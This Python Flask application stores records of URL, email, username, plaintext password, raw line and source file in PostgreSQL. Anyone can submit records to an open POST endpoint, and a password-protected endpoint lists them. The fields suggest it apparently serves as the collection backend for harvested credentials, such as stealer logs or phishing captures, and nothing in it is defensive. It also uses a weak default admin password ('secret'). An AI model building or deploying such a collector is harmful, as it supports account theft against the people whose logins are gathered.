import os
from flask import Flask, request, jsonify, Response
import psycopg2
from psycopg2.extras import RealDictCursor
from functools import wraps
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)

# ====== Database Config ======
DB_DSN = os.getenv("DATABASE_URL")  # Render sẽ cung cấp biến này
if not DB_DSN:
    raise RuntimeError("⚠️ DATABASE_URL chưa được cấu hình trong Render!")

# ép psycopg2 dùng SSL
DB_DSN += "?sslmode=require"


def get_db_conn():
    return psycopg2.connect(DB_DSN, cursor_factory=RealDictCursor)


def init_db():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            url TEXT,
            email TEXT,
            username TEXT,
            password TEXT,
            raw_line TEXT,
            source_file TEXT,
            processed_date TIMESTAMP DEFAULT NOW()
        )
    """)
    conn.commit()
    cur.close()
    conn.close()


# ====== Basic Auth cho /list ======
USERNAME = os.getenv("ADMIN_USER", "admin")
PASSWORD_HASH = generate_password_hash(os.getenv("ADMIN_PASS", "secret"))


def check_auth(username, password):
    return username == USERNAME and check_password_hash(PASSWORD_HASH, password)


def authenticate():
    return Response(
        "Authentication required", 401,
        {"WWW-Authenticate": 'Basic realm="Login Required"'}
    )


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)

    return decorated


# ====== API ======
@app.route("/log", methods=["POST"])
def log_data():
    data = request.json
    if not data:
        return jsonify({"error": "No data provided"}), 400

    try:
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute(
            """
            INSERT INTO logs (url, email, username, password, raw_line, source_file)
            VALUES (%s, %s, %s, %s, %s, %s)
            """,
            (
                data.get("url"),
                data.get("email"),
                data.get("username"),
                data.get("password"),
                data.get("raw_line"),
                data.get("source_file"),
            ),
        )
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/list", methods=["GET"])
@requires_auth
def list_data():
    try:
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 100")
        rows = cur.fetchall()
        cur.close()
        conn.close()
        return jsonify(rows)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ====== Entry Point ======
if __name__ == "__main__":
    init_db()  # chỉ chạy khi start app trực tiếp
    app.run(host="0.0.0.0", port=5000)
